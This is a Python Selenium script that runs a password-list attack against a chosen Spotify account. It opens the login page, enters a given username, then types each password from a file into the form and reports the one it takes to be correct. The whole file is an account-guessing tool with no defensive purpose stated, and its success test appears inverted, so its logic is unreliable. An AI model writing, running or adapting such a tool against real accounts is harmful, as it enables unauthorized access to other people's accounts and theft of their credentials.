from selenium import webdriver
from selenium.webdriver.common.by import By
import time


# Function to open the Spotify login page
def open_spotify_login_page():
    driver.get("https://accounts.spotify.com/en/login?continue=https%3A%2F%2Fopen.spotify.com%2F")


# Function to enter the username into the username field
def enter_username(username):
    username_field = driver.find_element(By.ID, "login-username")
    username_field.send_keys(username)


# Function to read passwords from a file
def read_passwords(password_list):
    with open(password_list, 'r') as file:
        return file.readlines()


# Function to try passwords from the list
def try_passwords(passwords, timeout):
    for password in passwords:
        password = password.strip()  # Remove newline characters

        # Fill in the password field
        password_field = driver.find_element(By.ID, "login-password")
        password_field.clear()  # Clear the field first
        password_field.send_keys(password)

        # Click the login button
        login_button = driver.find_element(By.ID, "login-button")
        login_button.click()

        # Wait for a while to complete the process (enough time to check if the password is correct)
        time.sleep(int(timeout))

        # If login is successful, exit the loop
        print(driver.current_url)
        if "open" not in driver.current_url:
            print("Successfully logged in! Password: ", password)
            break
        else:
            print("Tried password: ", password)


# Function to close the driver
def close_driver():
    time.sleep(1000000000)
    driver.quit()


if __name__ == "__main__":
    timeout = input("Enter the timeout: ")
    username = input("Enter the username: ")
    password_list = input("Enter the password list path: ")

    driver = webdriver.Chrome()

    open_spotify_login_page()
    enter_username(username)
    passwords = read_passwords(password_list)
    try_passwords(passwords, timeout)
    close_driver()
